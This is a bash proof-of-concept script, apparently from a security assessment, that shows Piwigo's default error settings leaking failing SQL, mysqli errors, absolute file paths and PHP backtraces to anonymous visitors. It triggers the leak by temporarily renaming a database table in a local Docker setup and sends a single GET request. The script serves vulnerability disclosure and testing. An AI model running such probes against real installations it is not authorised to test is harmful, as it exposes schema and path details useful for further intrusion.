#!/usr/bin/env bash
# piwigo-default-error-sql-trace-disclosure.sh — F-4 PoC.
#
# With the vendor-default $conf['die_on_sql_error']=true and
# $conf['show_php_errors_on_frontend']=true, any mysqli query that fails
# causes fatal_error() to echo the failing SQL string, the mysqli error
# string, and a PHP debug_backtrace() to the response body. The header
# status is 500. The disclosure happens regardless of the caller's
# authentication state; the PoC reaches it anonymously.
#
# The PoC triggers the disclosure by renaming the piwigo_config table
# to piwigo_config_disabled. The next anon GET /index.php runs the
# session bootstrap query and the conf loader, both of which SELECT
# from piwigo_config; both fail with a "Table doesn't exist" mysqli
# error. The response body contains the failing SQL, the mysqli error,
# and a PHP backtrace. The PoC then renames the table back, restoring
# the install.
#
# The PoC does not run any SQL itself; it only renames and restores a
# table. The contents of the table are unchanged.
#
# Usage:
#   piwigo-default-error-sql-trace-disclosure.sh --base http://localhost:8089 --confirm-authorised
#
# Required flag:
#   --confirm-authorised         the operator asserts this is on an authorised target
#
# Optional:
#   --base URL                   base URL of the Piwigo install (default http://localhost:8089)
#   --evidence FILE              write the response body to FILE (default ./evidence/default-error-sql-trace-disclosure.txt)

set -euo pipefail

BASE="http://localhost:8089"
EVIDENCE="./evidence/default-error-sql-trace-disclosure.txt"
CONFIRM=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --base)            BASE="$2"; shift 2 ;;
    --evidence)        EVIDENCE="$2"; shift 2 ;;
    --confirm-authorised) CONFIRM=1; shift ;;
    -h|--help)
      sed -n '2,28p' "$0" | sed 's/^# \?//'
      exit 0
      ;;
    *)
      echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

if [[ "$CONFIRM" -ne 1 ]]; then
  echo "refusing to run without --confirm-authorised" >&2
  echo "this PoC is for targets you are authorised to test" >&2
  exit 1
fi

mkdir -p "$(dirname "$EVIDENCE")"

DB_USER="${PIWIGO_POC_DB_USER:-piwigo}"
DB_PASS="${PIWIGO_POC_DB_PASSWORD:-piwigo-poc}"
DB_NAME="${PIWIGO_POC_DB_NAME:-piwigo}"
DB_SERVICE="${PIWIGO_POC_DB_SERVICE:-piwigo-poc-db}"

cleanup() {
  echo "[sql-trace] cleanup: restoring piwigo_config"
  docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -e \
    "RENAME TABLE piwigo_config_disabled TO piwigo_config;" 2>/dev/null || true
}
trap cleanup EXIT

echo "[sql-trace] step 1: rename piwigo_config -> piwigo_config_disabled (the install continues to run, but the table is now invisible)"
docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -e \
  "RENAME TABLE piwigo_config TO piwigo_config_disabled;"

echo "[sql-trace] step 2: anonymous GET $BASE/index.php (no cookies, no token)"
HTTP=$(curl -s -o "$EVIDENCE.body" -w '%{http_code}' \
  "$BASE/index.php")
echo "[sql-trace] HTTP $HTTP, body bytes: $(wc -c < "$EVIDENCE.body")"
echo "[sql-trace] response body (first 2000 bytes):"
head -c 2000 "$EVIDENCE.body" | sed 's/^/    /'
echo

# Assertion: the body should contain a mysqli error plus the failing
# query text plus a backtrace with absolute paths. Two acceptable forms
# depending on the PHP runtime:
#   - PHP 7 + mysqli errno path:     "[mysql error NNNN] <text>"
#                                 + "#0 .../functions_mysqli.inc.php(NN): mysqli->query(...)"
#   - PHP 8 uncaught exception path: "Uncaught mysqli_sql_exception: <text> in <file>:<line>"
#                                 + "Stack trace:" + "#0 ..."
# Both forms disclose the schema, the SQL, the file paths, and the
# call graph; the PoC accepts either.
if grep -qE 'piwigo_config.*doesn.t exist|Table .piwigo_config. doesn.t exist' "$EVIDENCE.body" && \
   ( grep -qE '\[mysql error [0-9]+\]' "$EVIDENCE.body" || \
     grep -qE 'Uncaught mysqli_sql_exception|Stack trace:' "$EVIDENCE.body" ); then
  {
    echo "--- response body ---"
    cat "$EVIDENCE.body"
    echo
    echo "--- summary ---"
    echo "[sql-trace] HTTP: $HTTP"
    echo "[sql-trace] body bytes: $(wc -c < "$EVIDENCE.body")"
    echo "[sql-trace] FINDING CONFIRMED — anon request received the failing SQL, the mysqli error string, the absolute file paths, and the call graph in the response body."
    echo "[sql-trace] the disclosure is in the form of either the legacy my_error->fatal_error chain (PHP 7) or an uncaught mysqli_sql_exception (PHP 8). Both ship as vendor defaults."
  } > "$EVIDENCE"
  cat "$EVIDENCE"
  exit 0
fi

{
  echo "--- response body ---"
  cat "$EVIDENCE.body"
  echo
  echo "--- summary ---"
  echo "[sql-trace] HTTP: $HTTP"
  echo "[sql-trace] body bytes: $(wc -c < "$EVIDENCE.body")"
  echo "[sql-trace] no table-missing marker or mysqli error in body — the target may have a patched config or the rename did not trigger the expected query path."
} > "$EVIDENCE"
cat "$EVIDENCE"
exit 2
